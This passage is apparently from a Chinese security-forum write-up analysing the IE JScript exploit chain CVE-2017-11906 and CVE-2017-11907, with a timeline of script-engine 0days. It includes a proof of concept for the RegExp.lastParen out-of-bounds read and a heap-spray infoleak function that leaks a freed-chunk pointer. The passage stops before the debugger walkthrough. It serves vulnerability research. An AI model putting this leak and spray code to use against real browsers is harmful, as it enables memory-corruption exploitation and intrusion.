
# [原创]CVE-2017-11906 && CVE-2017-11907 组合漏洞分析笔记

[TOC]

## IE脚本引擎0day

在分析本次`jscript`组合漏洞之前，先跟随笔者回顾一下近几年的`IE 0day`，这里重点关注脚本引擎(`vbscript`/`jscript`/`jscript9`)相关的`0day`:

| 漏洞编号 | 脚本引擎类型 | 修复时间 |
| ------------- | ------------ | ---------- |
| CVE-2016-0189 | vbscript | 2016年05月 |
| CVE-2017-0149 | vbscript | 2017年03月 |
| CVE-2018-8174 | vbscript | 2018年05月 |
| CVE-2018-8373 | vbscript | 2018年08月 |
| CVE-2018-8653 | jscript | 2018年12月 |
| CVE-2019-1367 | jscript | 2019年09月 |
| CVE-2019-1429 | jscript | 2019年11月 |

接着跟随笔者一起看一下`vbscript`漏洞与利用相关的一些时间点：

> 1. 2014年08月，TK在BlackHat USA上做了题为《Write Once, Pwn Anywhere》的演讲，里面提出了一些IE浏览器利用的崭新思路(里面主要以`jscript9`为例)；
> 2. 2014年11月更新修复了yuange珍藏多年的CVE-2014-6332，于是yuange发布了他写的CVE-2014-6332的利用，公布了一种之前没有用过的利用方法(yuange称为DVE)；
> 3. 2016年05月，CVE-2016-0189这个`vbscript 0day`被修复，根据后续获得的细节，原始`0day`里面用到了TK文章里的利用编写方法。2016年06月国外安全公司Theori公开了逆向2016年05月补丁后写出的CVE-2016-0189利用代码，从此这份代码被广泛用于挂马；
> 4. 2017年02月，CVE-2017-0149这个`vbscript 0day`被用于实际攻击，微软在2017年03月修补了这个漏洞。在360于2018年底公布这个漏洞的相关细节前，这个漏洞基本上不为人知。根据后续获得的细节，这个漏洞的利用编写方式，除了新增部分Bypass CFG的代码，其手法和CVE-2016-0189的原始利用完全一致；
> 5. 2018年04月，微软的补丁中修复了一个`vbscript`模块的远程代码执行漏洞(CVE-2018-1004)，如果读者看过ZDI的《IT’S TIME TO TERMINATE THE TERMINATOR》这篇文章，就知道CVE-2018-1004已经涉及到`vbscript`的`Class_Terminate`回调。此时如果有一个手握类似`0day`的卖家，知道`Class_Terminate`回调函数即将引起微软的注意，一定非常急于出手，因为他知道这类`0day`距离被修补不远了；
> 6. 2018年04月下旬，CVE-2018-8174这个`vbscript 0day`被用在实际攻击中，这个漏洞和CVE-2018-1004非常相似，同样涉及到`Class_Terminate`回调。相关利用手法和前两个`vbscript`完全一致，但这次没有Bypass CFG部分的代码，说明攻击目标可能是Windows 7操作系统；
> 7. 2018年07月补丁后，CVE-2018-8373这个`vbscript 0day`被用于实际攻击，微软在2018年08月更新中修复了该漏洞。这个漏洞的利用代码同时借助`vbscript`和`jscript9`的语言特性来实现相关功能，并且用覆盖栈返回地址的方式Bypass CFG，说明利用编写着对`vbscript`和`jscript9`两个脚本引擎的内部实现非常熟悉；
> 8. 2019年08月，微软进一步在`win7`/`win8`上禁用了IE11中的`vbscript`

再跟随笔者看一下`jscript`相关漏洞的一些时间点：

> 1. 2017年12月，微软修复了多个谷歌报告的`jscript`漏洞，随后谷歌发布了一篇长文《aPAColypse now: Exploiting Windows 10 in a Local Network with WPAD/PAC and JScript》，详细介绍了Windows 10下利用WPAD协议，借助`jscript`漏洞进行攻击的方式。作者在文中对此类攻击方式表示担忧，并预测`jscript`模块中还有其他类似漏洞；
> 2. 2018年12月，微软修复了一个`jscript`远程代码执行漏洞CVE-2018-8653，这个漏洞的攻击方式采用的正是一年前谷歌文章中的方法，这次攻击的出现令原作者的担忧一语成谶；
> 3. 2019年08月，微软进一步在`win7`/`win8`上禁用了IE11中的`vbscript`，此时如果有一个专业的脚本引擎漏洞发现者/写手/卖家，一定会将开发重心进一步切换到`jscript`；
> 4. 2019年09月，微软又修复了一个`jscript 0day`，编号为CVE-2019-1367；从有限的披露信息《Patch Lady – what’s the real risk?》中(文末有参考链接)，我们可以知道这个漏洞是通过网页挂马的方式进行攻击的，发送给受害者的是内嵌`url`的`docx`文档，并且后续操作也涉及到了WPAD；
> 5. 2019年11月，微软再次修复一个`jscript 0day`，编号为CVE-2019-1429，这个漏洞同时被谷歌的Ivan Fratric独立报告给微软，网上目前已有该漏洞的PoC；

根据上述趋势，只要微软不禁用`jscript`，接下来还会有`jscript`的在野`0day`出现。`vbscript`和`jscript`是微软早期开发的两个脚本引擎，所以安全性问题较多。与`vbscript`漏洞的利用细节已经被广泛公开不同，关于`jscript`漏洞利用的手法，除了谷歌的上述文章，网上基本没有更多细节，所以`jscript`漏洞的调试目前仍然很难上手。

站在防御者的角度，我们必须预测攻击趋势，并且在攻击者实施下一步攻击之前进行有效防御。从这个出发点考虑，我们必须对`jscript`系列漏洞的利用方式有所了解。这一步骤完成后，当后面再出现`jscript`漏洞时，对漏洞原因/利用方式的分析的时间成本也都会降低。所以，选择一个`jscript`漏洞进行一番研究是非常有意义的。

基于上述考虑，笔者最近对《aPAColypse now: Exploiting Windows 10 in a Local Network with WPAD/PAC and JScript》这篇文章中涉及到的漏洞进行了详细调试（谷歌慷慨地公开了相关`exploit`代码，不过只针对`win10 64位`），根据文章中给出的步骤一步一步在`32位`环境上复现了`RCE`。在这个过程中同时参考了安恒信息安全研究院<a href="elink@7b6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9J5c8U0y4o6L8p5t1@1x3X3c8Z5b7h3k6$3f1$3H3%4K9Y4W2x3b7$3E0Y4L8f1p5`.">另一篇分析文章</a>(以下称这篇文章为“之前的分析文章”)。

整套利用代码涉及两个漏洞，一个信息泄露漏洞(`CVE-2017-11906`)和一个堆溢出漏洞(`CVE-2017-11907`)，这是一个组合漏洞利用链，整个利用链的编写需要注意许多细节，下面先跟随笔者来详细看一下这两个漏洞，然后讨论这个`jscript`漏洞利用链编写中需要注意的地方。

## CVE-2017-11906

这是`jscript`的一个信息泄露漏洞。利用代码中需要借助该漏洞泄露一块稳定的内存地址，用来存储伪造的`Jscript Object Memory`结构。我们先来看一下该漏洞的官方`PoC`：

```
<html>
<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
<script language="Jscript.Encode">
function go() {
var r = new RegExp(Array(100).join('()'));
''.search(r);
alert(RegExp.lastParen);
}
go();
</script>
</html>
```

我这里直接引用之前的分析文章中的话来描述这个漏洞：

> “这个信息泄露漏洞存在于`RegExp.lastParen`中，在调用任一`RegExp.test`、`RegExp.exec`或者`String.search`后，`jscript!RegExpFncObj`中会用数组保存`group`信息，这些信息实际上是匹配到的内容的开始位置和结束位置。由于用来保存`group`信息的数组大小固定为`20*4`(`32位`程序中)，也就是一共有`10`组`group`信息，所以当匹配到的`group数量`大于`10`时，`RegExp.lastParen`过大的下标会导致取值时发生越界读操作。数组中保存的起始位置和结束位置能够提供更大的可读空间，所以可以通过控制数组中的值来控制越界读的范围。”

在这个漏洞的具体使用中，我们主要关注的是`RegExp.lastParen`函数末尾的一处`memcpy`，如下：

![](upload/attach/201912/628056_HMUX6QN4SJME5D6.png)

`memcpy`有3个参数：`Dst`，`Src`，`Size`。当`PoC`中的`Array(x)`的`x`大小满足一定条件时，`Dst`对应调用`RegExp.lastParen`返回给我们的字符串，`Src`为被`search`的字符串(假设为`str`)首地址，`Size`完全可控，可以通过设置`RegExp.input`的值去控制`Size`，所以只要我们设置的`RegExp.input`超出`str.length`，即可实现越界读取。关于`32位`下`Array(X)`内`x`的取值，之前的分析文章中已经指出：

> “观察`jscript!RegExpFncObj`可以发现，如果用`31`个空括号组成的`RegExp`去搜索，同时在搜索结束后设置`RegExp.input`为任意整数，那么`RegExp.lastParen`的起始值为`0`而结束值则为`RegExp.input`设置的整数。”

上述结论在笔者的测试环境中得到了验证。

知道上述关键点后，读者就知道上述漏洞的利用实质是控制`memcpy`的相关参数，从而越界读取被`search`的字符串后紧邻的数据。由于非`LFH`堆的堆块在释放后，头部会存储一些指向下一个堆块的指针。如果我们可以在非`LFH`堆中连续申请许多等长字符串，然后释放其中的一半(奇数保留，偶数释放)，从而造成大量交替的内存空洞。随后对某个奇数索引对应的字符串进行`search`，借助这个信息泄露漏洞，就可以越界读取相邻的处于`free`状态的堆块里存储的另一个被`free`的堆块指针。读取相应指针后，再立即用设计好的字符串重用之前被释放的字符串。这样泄露出来的指针就指向一块已经被控的内存。

这部分的代码最终如下：

```
function infoleak() {
var str = "aaaaaaaaaa";
while(str.length < 10000)
str = str + str;
for(var i=0; i<1000; i++) {
strarr[i] = str.substr(0,10000);
}
for(var i=0; i<500; i++) {
strarr[i*2] = 1;
}
CollectGarbage();
var x = 0x2738;
var r = new RegExp(Array(32).join('()'));
strarr[737].search(r);
RegExp.input = x;
var leak = RegExp.lastParen;
if(leak.length != 0x2738) {
return 0;
}
if((leak.charCodeAt(0x2737) != 0x61) || (leak.charCodeAt(0x2736) != 0x61)) {
return 0;
}
straddress = dwordFromStr(leak, 0x271c) + 4;
if(!isAddress(straddress)) {
return 0;
}
// 此处编写对straddress地址的重用代码
return 1;
}
```

现在跟随笔者打开一次调试器，利用上面的`js`代码，我们在上述`memcpy`处下一个断点，看一下这`3`个参数在调试器中的情况：
